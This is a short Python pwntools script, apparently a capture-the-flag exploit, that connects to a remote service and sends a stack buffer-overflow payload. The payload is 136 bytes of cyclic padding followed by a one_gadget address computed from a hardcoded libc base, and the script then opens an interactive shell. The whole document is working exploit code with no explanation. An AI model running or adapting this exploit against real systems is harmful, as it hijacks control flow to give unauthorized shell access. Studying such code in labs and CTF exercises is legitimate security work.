from pwn import *

context.terminal = ['urxvt', '-e', 'sh', '-c']
#io = process("./files/vuln_patched")
io = remote("alex.lukin.family", 1350)

# gdb.attach(io)

libc_base = 0x7ffff7a0d000 
one_gadget = libc_base + 0x4527a

payload = cyclic(136)
payload += p64(one_gadget)
payload += p64(0)*14



io.recvuntil(">")
io.sendline(payload)
io.interactive()